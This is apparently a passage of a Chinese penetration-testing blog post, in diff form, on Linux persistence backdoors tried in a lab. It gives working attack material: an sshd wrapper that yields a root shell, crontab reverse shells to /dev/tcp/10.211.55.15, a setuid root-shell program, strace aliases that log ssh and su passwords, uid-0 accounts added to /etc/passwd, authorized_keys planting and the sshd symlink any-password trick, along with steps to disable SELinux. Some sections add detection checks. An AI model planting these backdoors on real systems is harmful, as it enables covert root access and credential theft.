+<p>后门代码解释：<br>第一行，如果当前文件句柄STDIN是一个socket，且socket的远程连接源端口是31334（Big网络字节序中的16进制字符串为<code>\x00\x00zf</code>， 正好匹配上perl正则<code>..zf</code>，上述代码中的<code>zf</code>是Big网络字节序的Ascii表示形式），则执行<code>/bin/sh</code>，并结束当前程序运行（不会执行第二步），相当于反弹一个root shell（因为sshd是以root权限运行的）给远程socket（一般只有攻击者指定连接的源端口才能触发这一行的执行）<br>第二行，启动sshd(/usr/bin/sshd是真正的sshd)服务，凡是传递给<code>/usr/sbin/sshd</code>(后门)的参数都传递给真正的sshd（这一行保证了普通用户也可以正常使用ssh服务，登录并不会有什么异常现象）</p>
+<p>攻击主机上执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:10.18.180.20:22,sourceport&#x3D;13377</span><br></pre></td></tr></table></figure>
+<p>源端口修改计算：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> struct</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">19526</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span><br><span class="line"><span class="string">&#x27;\x00\x00LF&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">13377</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> buffer</span><br><span class="line">4A</span><br></pre></td></tr></table></figure>
+
+<p>还有一个Python版:<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/75864959">使用python编写了openssh后门</a>，没有试。</p>
+<h4 id="CentOS7实践的坑"><a href="#CentOS7实践的坑" class="headerlink" title="CentOS7实践的坑"></a>CentOS7实践的坑</h4><p>把<code>/usr/sbin/sshd</code>篡改后，正常用户无法ssh连上去。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># mieea @ mieea-mbp in ~ [9:08:38]</span><br><span class="line">$ ssh u111@10.211.55.12 -p 22</span><br><span class="line">u111@10.211.55.12&#39;s password:</span><br><span class="line">Last login: Fri Oct 30 09:05:02 2020</span><br><span class="line">&#x2F;bin&#x2F;bash: Permission denied</span><br><span class="line">Connection to 10.211.55.12 closed.</span><br></pre></td></tr></table></figure>
+<p>搜索后发现是由于SeLinux检测到sshd文件已更改，因此如果不禁用SeLinux，它将阻止通过ssh连接服务器。<br>于是我把<code>/etc/selinux/config</code>的SELinux属性设置为disabled，再<code>reboot</code>重启，ssh就能正常使用了。</p>
+<p>因为遇到这个问题，我在Ubuntu18.04下也试了一次，并没有影响正常用户ssh连接。nice :)</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1].<a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/tips-1951.html">渗透技巧之SSH篇</a><br>[2].<a target="_blank" rel="noopener" href="https://www.fr1sh.com/?post=8">【转载】一款短小精致的SSH后门分析</a><br>[3].<a target="_blank" rel="noopener" href="https://www.einfosec.com.cn/2019/11/27/hide-openssh-version/">Hide OpenSSH version</a>–解决CentOS实践的坑<br>[4].<a target="_blank" rel="noopener" href="https://www.linuxidc.com/Linux/2019-11/161565.htm">如何在CentOS 8上禁用SELinux</a><br>[5].<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/243862.html">Linux基础软件威胁疑云：从已知到“未知”</a><br>[6].<a target="_blank" rel="noopener" href="https://www.welivesecurity.com/wp-content/uploads/2018/12/ESET-The_Dark_Side_of_the_ForSSHe.pdf">ESET-The_Dark_Side_of_the_ForSSHe.pdf</a></p>
+<h3 id="排查方式-1"><a href="#排查方式-1" class="headerlink" title="排查方式"></a>排查方式</h3><p>查MD5看是否被篡改。<br>CentOS：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpm -Vf &#x2F;usr&#x2F;bin&#x2F;ssh</span><br><span class="line">rpm -Va</span><br></pre></td></tr></table></figure>
+<p>Ubuntu:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo debsums --changed</span><br></pre></td></tr></table></figure>
+
+<h2 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h2><p>pam后门通常是指pam源码包修改重编译替换。<br>推荐阅读:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7902">Linux Pam后门总结拓展</a><br>总体和前面OpenSSH源码植入代码重新打包的感觉很像，而且更加繁琐。校验方式也是和SSH校验一样的，官方校验。</p>
+<h2 id="VIM后门"><a href="#VIM后门" class="headerlink" title="VIM后门"></a>VIM后门</h2><p>命令：<br><code>$(nohup vim -E -c &quot;pyfile door.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f door.py</code><br>试了试感觉异常的不好用，所以也不写了。</p>
+<h3 id="排查方式-2"><a href="#排查方式-2" class="headerlink" title="排查方式"></a>排查方式</h3><p>检测对应vim进程号虚拟目录的map文件是否有python字符。(是否不够靠谱?)</p>
+<h2 id="stace记录后门"><a href="#stace记录后门" class="headerlink" title="stace记录后门"></a>stace记录后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source &#x2F;root&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
+<p>使用了一下感觉还行？主要是简单，但log文件有点太大了。</p>
+<p>按理说su命令也可以做类似操作，但实际不行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias su&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.su.log -e read,write,connect -s 2048 su&#39;</span><br></pre></td></tr></table></figure>
+<p>分析参见: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2917">利用su小偷实现低权限用户窃取root用户口令</a></p>
+<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source &#x2F;root&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
+<p>这里是改的<code>/etc/bashrc</code>，改动后所有新打开的bash都会生效。<br><code>/etc</code>路径下的配置文件将会应用到整个系统，属于系统级的配置，而修改用户目录下的<code>.bashrc</code>则只是限制在用户应用上，属于用户级设置。</p>
+<h3 id="排查-3"><a href="#排查-3" class="headerlink" title="排查"></a>排查</h3><p>使用<code>alias</code>命令即可发现，或者去排查<code>/etc/bashrc</code>等shell配置文件。</p>
+<h2 id="基于suid衍生后门"><a href="#基于suid衍生后门" class="headerlink" title="基于suid衍生后门"></a>基于suid衍生后门</h2><p>setuid: 设置使文件在执行阶段具有文件所有者的权限. 典型的文件是 /usr/bin/passwd. 如果一般用户执行该文件， 则在执行过程中， 该文件可以获得root权限， 从而可以更改用户的密码.</p>
+<h3 id="基础后门示例"><a href="#基础后门示例" class="headerlink" title="基础后门示例"></a>基础后门示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>)</span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, argv[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译加权：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc backdoor.c -o backdoor</span><br><span class="line">chmod u+s &#x2F;bin&#x2F;backdoor</span><br></pre></td></tr></table></figure>
+
+<h2 id="常规crontab反弹shell"><a href="#常规crontab反弹shell" class="headerlink" title="常规crontab反弹shell"></a>常规crontab反弹shell</h2><p>CentOS定时任务参数说明: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[u111@CentOS7 cron.d]$ cat &#x2F;etc&#x2F;crontab</span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">PATH&#x3D;&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line">MAILTO&#x3D;root</span><br><span class="line"></span><br><span class="line"># For details see man 4 crontabs</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name  command to be executed</span><br></pre></td></tr></table></figure>
+
+<p>Ubuntu定时任务参数说明:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">u111@host1:&#x2F;var&#x2F;spool&#x2F;cron$ cat &#x2F;etc&#x2F;crontab</span><br><span class="line"># &#x2F;etc&#x2F;crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># m h dom mon dow user	command</span><br><span class="line">17 *	* * *	root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly</span><br><span class="line">25 6	* * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )</span><br><span class="line">47 6	* * 7	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )</span><br><span class="line">52 6	1 * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+
+<p>基本是没什么区别，但ubuntu有一个坑点需要注意，就是<code>/bin/sh</code>指向<code>dash</code>从而会导致反弹失败。<br>参考阅读: <a target="_blank" rel="noopener" href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">解决ubuntu crontab反弹shell失败的问题</a></p>
+<p>辅助工具: <a target="_blank" rel="noopener" href="https://tool.lu/crontab/">crontab执行时间计算</a></p>
+<h3 id="反弹示例1"><a href="#反弹示例1" class="headerlink" title="反弹示例1"></a>反弹示例1</h3><p>实验环境CentOS7<br>存放反弹文件<code>doorr.sh</code>:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.211.55.15/12323  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>输入命令<code>crontab -e</code>进行编辑，加入内容:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;3 * * * * bash &#x2F;home&#x2F;u111&#x2F;doorr.sh</span><br></pre></td></tr></table></figure>
+<p><code>doorr.sh</code>设置了<code>u+x</code>，但普通用户和root用户的<code>crontab -e</code>依旧影响权限，普通反弹普通用户shell，root的才能反弹root。可能有办法在普通用户的crontab反弹root权限shell，暂时没查。</p>
+<h3 id="反弹示例2"><a href="#反弹示例2" class="headerlink" title="反弹示例2"></a>反弹示例2</h3><p>实验环境CentOS7<br>root用户输入命令<code>crontab -e</code>进行编辑，加入内容:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.211.55.15&#x2F;12323  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>会在<code>/var/spool/cron</code>目录下生成<code>root</code>文件，注意文件权限为600。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@CentOS7 cron]# pwd</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">[root@CentOS7 cron]# ll</span><br><span class="line">总用量 4</span><br><span class="line">-rw-------. 1 root root 58 11月  6 14:42 root</span><br></pre></td></tr></table></figure>
+<p>如果是普通用户u111输入命令<code>crontab -e</code>进行创建，则会生成<code>/var/spool/cron/u111</code>文件。</p>
+<h3 id="Ubuntu反弹注意事项"><a href="#Ubuntu反弹注意事项" class="headerlink" title="Ubuntu反弹注意事项"></a>Ubuntu反弹注意事项</h3><p>实验环境Ubuntu18.04<br>解决方式1: 将<code>/bin/sh</code>指向从<code>dash</code>改到<code>bash</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s -f bash &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+<p>解决方式2: 避免在cron文件里去使用bash这个shell，另外去建一个反弹shell的shell脚本文件，然后在任务计划里面去直接调用这个shell脚本文件。<br>脚本文件<code>/root/doorr.sh</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.211.55.15&#x2F;12323  0&gt;&amp;1　</span><br></pre></td></tr></table></figure>
+<p><code>crontab -e</code>进行编辑，加入内容:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;1 * * * * &#x2F;root&#x2F;doorr.sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="排查-4"><a href="#排查-4" class="headerlink" title="排查"></a>排查</h3><p>一般通过<code>crontab -l</code>命令即可检测到定时任务后门。<code>crontab -r</code>进行删除。</p>
+<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p>[1].<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/115082330">CentOS7定时任务crontab入门</a></p>
+<h2 id="开机启动init-d"><a href="#开机启动init-d" class="headerlink" title="开机启动init.d"></a>开机启动init.d</h2><h3 id="functions"><a href="#functions" class="headerlink" title="functions"></a>functions</h3><p>将后门代码藏到<code>/etc/rc.d/init.d/functions</code>中。<br><img src="/images/Linux%E7%BB%B4%E6%9D%83%E5%90%8E%E9%97%A8_functions.png" alt="Linux维权后门_functions"></p>
+<h3 id="排查-5"><a href="#排查-5" class="headerlink" title="排查"></a>排查</h3><p>不同的linux发行版可能查看开机启动项的文件不大相同。<br>Debian系linux系统一般是通过查看<code>/etc/init.d</code>目录有无最近修改和异常的开机启动项。<br>而Redhat系的linux系统一般是查看<code>/etc/rc.d/init.d</code>或者<code>/etc/systemd/system</code>等目录。</p>
+<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><h3 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h3><p>learn from: <a target="_blank" rel="noopener" href="https://ixyzero.com/blog/archives/2717.html">BROOTKIT代码学习和原理分析</a><br>关于BROOTKIT如何实现文件、进程、端口的隐藏和盗取root用户密码：<br><code>install.sh</code>安装程序中有一行代码：<code>cp brootkit.sh /etc/profile.d/emacs.sh</code>，这一行代码的作用在于——以后每次打开一个登录shell的时候都会加载这个脚本（而脚本中的内容是一些和builtin命令重名的自定义function），从而实现Bash函数重载，过滤掉相关输出内容，这样就可以达到自定义隐藏文件、进程、端口+盗取root用户密码的目的。<br>但是简单的函数重载会被Bash内建的builtin/declare/typeset/type/set/command等命令识别出来，所以，除了给ls/ps/netstat等命令重新实现function之外，还需要做进一步的处理，即将这些builtin命令也进行重载。这样就可以实现自定义隐藏文件、进程、端口+盗取root用户密码的功能。</p>
+<p>在Bash中命令的执行遵循下面的顺序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 自定义alias: alias su&#x3D;&quot;ls -l&quot;</span><br><span class="line">2. 自定义function: function su &#123; echo &quot;Hello world&quot;; &#125;</span><br><span class="line">3. Bash内置命令builtin</span><br><span class="line">4. 外部程序(在环境变量PATH中进行查找)</span><br></pre></td></tr></table></figure>
+
+<h2 id="简单但容易被发现系列"><a href="#简单但容易被发现系列" class="headerlink" title="简单但容易被发现系列"></a>简单但容易被发现系列</h2><h3 id="添加root权限后门用户"><a href="#添加root权限后门用户" class="headerlink" title="添加root权限后门用户"></a>添加root权限后门用户</h3><h4 id="Way1"><a href="#Way1" class="headerlink" title="Way1"></a>Way1</h4><p>用脚本生成密码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[u111@CentOS7 ~]$ perl -e &#39;print crypt(&quot;233233&quot;,&quot;\$6\$lfeC2bwp\$&quot;) . &quot;\n&quot;&#39;</span><br><span class="line">$6$lfeC2bwp$CHZDNi3FN4Wx7CfZ4hmsQ2EobrMxnLT4ox9bPgkloSzGOXEaY8ovBOYIxMfuWU.4GTcg7rq65Mq0flISqZHE01</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/etc/passwd</code>中追加用户:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor:$6$lfeC2bwp$CHZDNi3FN4Wx7CfZ4hmsQ2EobrMxnLT4ox9bPgkloSzGOXEaY8ovBOYIxMfuWU.4GTcg7rq65Mq0flISqZHE01:1000:1000::&#x2F;home&#x2F;u111:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>原本我想添加root组，但是因为这边限制了root无法远程ssh，所以改到了u111。但是接下来又出现了问题:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[u111@CentOS7 ~]$ sudo cat &#x2F;etc&#x2F;passwd</span><br><span class="line">[sudo] u111 的密码：</span><br><span class="line">u111 不在 sudoers 文件中。此事将被报告。</span><br></pre></td></tr></table></figure>
+<p>但我<code>su</code>能直接切到root权限，然后就正常了，不太明白但暂时就这样把:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># mieea @ mieea-mbp in ~ [15:10:53]</span><br><span class="line">$ ssh backdoor@10.211.55.12</span><br><span class="line">backdoor@10.211.55.12&#39;s password:</span><br><span class="line">Last login: Mon Nov  2 15:09:14 2020 from 10.211.55.2</span><br><span class="line">[u111@CentOS7 ~]$ whoami</span><br><span class="line">u111</span><br><span class="line">[u111@CentOS7 ~]$ su</span><br><span class="line">密码：</span><br><span class="line">[root@CentOS7 u111]# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<h4 id="Way2"><a href="#Way2" class="headerlink" title="Way2"></a>Way2</h4><p>用脚本生成密码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[u111@CentOS7 ~]$ perl -e &#39;print crypt(&quot;678233&quot;,&quot;\$6\$lfeC2bwp\$&quot;) . &quot;\n&quot;&#39;</span><br><span class="line">$6$lfeC2bwp$Edp4I6FXzv17d&#x2F;V2&#x2F;f2KbkFQ6b3paA21f722955psSd4t2GbWe4yzy29ftRRuW91Bbog7u42cg4tU52NIMxRm&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/etc/passwd</code>中追加用户:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor2:$6$lfeC2bwp$Edp4I6FXzv17d&#x2F;V2&#x2F;f2KbkFQ6b3paA21f722955psSd4t2GbWe4yzy29ftRRuW91Bbog7u42cg4tU52NIMxRm&#x2F;:0:0::&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>一般都会限制root的远程ssh登陆，因此:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure>
+<p>将<code>PermitRootLogin</code>的值改成yes。<br>再重启sshd:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service sshd restart</span><br></pre></td></tr></table></figure>
+
+<p>登陆成功:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># mieea @ mieea-mbp in ~ [15:33:32] C:255</span><br><span class="line">$ ssh backdoor2@10.211.55.12</span><br><span class="line">backdoor2@10.211.55.12&#39;s password:</span><br><span class="line">Last login: Mon Nov  2 15:31:59 2020 from 10.211.55.2</span><br><span class="line">[root@CentOS7 ~]# w</span><br><span class="line"> 15:34:06 up  1:12,  2 users,  load average: 0.00, 0.01, 0.01</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">u111     tty1                      14:44   49:10   0.00s  0.00s -bash</span><br><span class="line">backdoor pts&#x2F;0    10.211.55.2      15:34    3.00s  0.00s  0.00s w</span><br><span class="line">[root@CentOS7 ~]# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<h4 id="可疑用户排查"><a href="#可疑用户排查" class="headerlink" title="可疑用户排查"></a>可疑用户排查</h4><h3 id="ssh公钥添加"><a href="#ssh公钥添加" class="headerlink" title="ssh公钥添加"></a>ssh公钥添加</h3><p>在攻击机任意地方执行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -b 4096 -t rsa -C &quot;&quot;</span><br><span class="line"></span><br><span class="line"> -t 指定加密算法，使用 -b 自定生成密钥长度，使用 -C 添加密钥对的说明comment。生成的密钥对默认存储在用户目录下的 .ssh 目录中，私钥默认名称为 id_*** (即 id_ + 加密算法名称)。还可以使用 -f 指定生成的私钥存储的文件全路径名称；也可以不使用 -f 指定密钥文件路径，在密钥的创建过程中还会提示用户输入密钥文件全路径名称。私钥对应的公钥文件为私钥文件全名称 + .pub。</span><br></pre></td></tr></table></figure>
+
+<p>受害机:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure>
+<p>攻击者的id_rsa.pub内容粘贴到文件里面(如果原来存在内容就另起一行粘贴)</p>
+<p>然后就能在攻击机登陆上去了:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i &#x2F;Users&#x2F;mieea&#x2F;.ssh&#x2F;testkey root@10.211.55.12</span><br></pre></td></tr></table></figure>
+
+<h3 id="ssh软连接"><a href="#ssh软连接" class="headerlink" title="ssh软连接"></a>ssh软连接</h3><p>经典后门，直接对sshd建立软连接，之后用任意密码登录即可。<br>原命令：<code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=12345;</code></p>
+<p>原理分析完整:<a target="_blank" rel="noopener" href="https://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/">Linux软连接ssh后门之我见</a><br>摘要一下重点:<br>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0(root)即可成功认证登陆。<br>为什么是通过软连接的方式？因为PAM认证是通过软连接的文件名(如<code>/tmp/su</code>,<code>/home/su</code>)在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如：<code>/etc/pam.d/su</code>)<br>任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，只要PAM配置文件中包含此配置即可SSH任意密码登陆，实践表明，可成功利用的PAM配置文件除了su还有chsh、chfn。</p>
+<h4 id="实践的坑点"><a href="#实践的坑点" class="headerlink" title="实践的坑点"></a>实践的坑点</h4><p>CentOS7:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oport&#x3D;12345</span><br></pre></td></tr></table></figure>
+<p>软连接建立后，新的端口链接被拒绝。即<code>-p 22</code>是正常的，<code>-p 12345</code>拒绝连接。<br>搜索后发现应该和SELinux和防火墙有关，进行以下操作后就能任意密码登陆:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">semanage port -a -t ssh_port_t -p tcp 12345</span><br><span class="line">firewall-cmd --permanent --zone&#x3D;public --add-port&#x3D;12345&#x2F;tcp</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
+<p>参考:<a target="_blank" rel="noopener" href="https://github.com/LLLeon/Blog/issues/8">更改CentOS7默认的SSH端口</a></p>
+<p>Ubuntu18.04:</p>
